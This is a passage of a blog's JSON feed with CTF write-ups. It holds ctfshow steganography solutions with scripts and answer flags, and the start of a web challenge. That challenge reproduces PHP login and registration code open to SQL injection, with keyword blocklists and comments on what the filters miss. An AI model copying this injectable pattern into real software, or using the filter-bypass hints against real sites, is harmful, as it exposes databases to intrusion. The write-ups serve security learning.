punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>l<span class=\"token operator\">=</span>txt<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"FFE\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    flag <span class=\"token operator\">+=</span> l<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#结果套上 ctfshow &#123;&#125;</span></pre></td></tr></table></figure><p>其实就是把 FFE 后面的那个字符提取出来，再连接在一起，一共 32 位 ()，这就是 flag。</p>\n<p><code>ctfshow&#123;0c618671a153f5da3948fdb2a2238e44&#125;</code></p>\n<h1 id=\"图片篇颜色通道\"><a class=\"anchor\" href=\"#图片篇颜色通道\">#</a> 图片篇 (颜色通道)</h1>\n<h2 id=\"misc50\"><a class=\"anchor\" href=\"#misc50\">#</a> misc50</h2>\n<p>StegSolve 打开</p>\n<p>调整颜色通道，发现在 red1,green0,blue2 有 flag 的图片，</p>\n<p>拼合 flag 的信息，得到</p>\n<p><code>ctfshow&#123;84470883ee1eec2e886436461bf79111&#125;</code></p>\n<h2 id=\"misc51\"><a class=\"anchor\" href=\"#misc51\">#</a> misc51</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>im<span class=\"token operator\">=</span>Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'misc51.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>im <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">900</span><span class=\"token punctuation\">,</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dic <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">900</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span> w <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        s <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>getpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        dic<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> dic<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lt <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>dic<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>lt<span class=\"token punctuation\">.</span>sort<span class=\"token punctuation\">(</span>key <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span>x<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>lt<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>im<span class=\"token operator\">=</span>Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'misc51.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>im <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">900</span><span class=\"token punctuation\">,</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">900</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> w <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        s <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>getpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> s <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> s <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            img<span class=\"token punctuation\">.</span>putpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>h<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>img<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>ctfshow&#123;51fcc6228d768a3acab1d05572e52133&#125;</code></p>\n<h2 id=\"misc52\"><a class=\"anchor\" href=\"#misc52\">#</a> misc52</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>im<span class=\"token operator\">=</span>Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'misc52.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>im <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">900</span><span class=\"token punctuation\">,</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lt <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">176</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">217</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">146</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">251</span><span class=\"token punctuation\">,</span> <span class=\"token number\">160</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">129</span><span class=\"token punctuation\">,</span> <span class=\"token number\">88</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">187</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">231</span><span class=\"token punctuation\">,</span> <span class=\"token number\">225</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">196</span><span class=\"token punctuation\">,</span> <span class=\"token number\">144</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> h <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">900</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> w <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        s <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>getpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> s <span class=\"token keyword\">in</span> lt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            img<span class=\"token punctuation\">.</span>putpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>h<span class=\"token punctuation\">,</span> w<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>img<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>ctfshow&#123;f87ad503c2c163471fbe768c9d7a9d6c&#125;</code></p>\n<h2 id=\"misc53\"><a class=\"anchor\" href=\"#misc53\">#</a> misc53</h2>\n<p>LSB</p>\n<p>StegSolve</p>\n<p>000,RGB,Row</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>63746673686f777b 3639383330643561  ctfshow&#123; 69830d5a</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>3361336235303036 6637623131313933  3a3b5006 f7b11193</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>6539626332326132 7dffffffffffffff  e9bc22a2 &#125;.......</pre></td></tr></table></figure><p><code>ctfshow&#123;69830d5a3a3b5006f7b11193e9bc22a2&#125;</code></p>\n<h2 id=\"misc54\"><a class=\"anchor\" href=\"#misc54\">#</a> misc54</h2>\n<p>LSB</p>\n<p>参数改为</p>\n<p>MSB,BRG,Column，alpha:0,green:0,blue:0</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>63746673686f777b 6231663861623234  ctfshow&#123; b1f8ab24</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>6238636132323364 3061666662663337  b8ca223d 0affbf37</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>3262613065346661 7dffffffffffffff  2ba0e4fa &#125;.......</pre></td></tr></table></figure><p><code>ctfshow&#123;b1f8ab24b8ca223d0affbf372ba0e4fa&#125;</code></p>\n<h2 id=\"misc55\"><a class=\"anchor\" href=\"#misc55\">#</a> misc55</h2>\n<p>图片反转</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'misc55.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>img<span class=\"token punctuation\">.</span>transpose<span class=\"token punctuation\">(</span>Image<span class=\"token punctuation\">.</span>FLIP_TOP_BOTTOM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">'out.png'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>rgb,000,column,lsb, 得到</p>\n<p><code>PK</code>  头，保存，另存为一个压缩包文件</p>\n<p>解压得到 <code>旗子</code> 文件，打开得到 flag</p>\n<p><code>ctfshow&#123;daf256838e19a19d9e7b0a69642ad5ee&#125;</code></p>\n<h2 id=\"misc56\"><a class=\"anchor\" href=\"#misc56\">#</a> misc56</h2>\n<p>StegSolve 打开，可以看到通道 R4、R2、R1，G4、G2、G1 有隐写痕迹</p>\n<p>RGB,Row，MSB，</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>63746673686f777b 3162333063323861  ctfshow&#123; 1b30c28a</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>3566636136636563 3538383662316432  5fca6cec 5886b1d2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>6363386231323633 7dffffffffffffff  cc8b1263 &#125;.......</pre></td></tr></table></figure><p><code>ctfshow&#123;1b30c28a5fca6cec5886b1d2cc8b1263&#125;</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%86%85%E9%83%A8%E8%B5%9B/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%86%85%E9%83%A8%E8%B5%9B/",
            "title": "内部赛",
            "date_published": "2022-10-04T15:38:40.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"签到\"><a class=\"anchor\" href=\"#签到\">#</a> 签到</h2>\n<p>进入后，发现是一个登录界面，很明显为 sql 注入，访问 www.zip 得到源码 login.php</p>\n<p>login.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/load|and|or|\\||\\&amp;|select|union|\\'|=| |\\\\\\|,|sleep|ascii/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 过滤了 and、or、'、select，                  \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</span><span class=\"token comment\">// 那么在此处行不通</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('bad hacker!')&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>           <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'db.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$e</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$p</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select username from test1 where email='<span class=\"token interpolation\"><span class=\"token variable\">$e</span></span>' and password='<span class=\"token interpolation\"><span class=\"token variable\">$p</span></span>'\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//sql 语句</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location:user.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 跳转到 user.php</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('Wrong username or password')&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>register.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/load|and|\\||\\&amp;| |\\\\\\|sleep|ascii|if/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 没有过滤分号，也没有过滤查询，可以尝试 sql 注入</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('bad hacker!')&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>           <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'db.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token 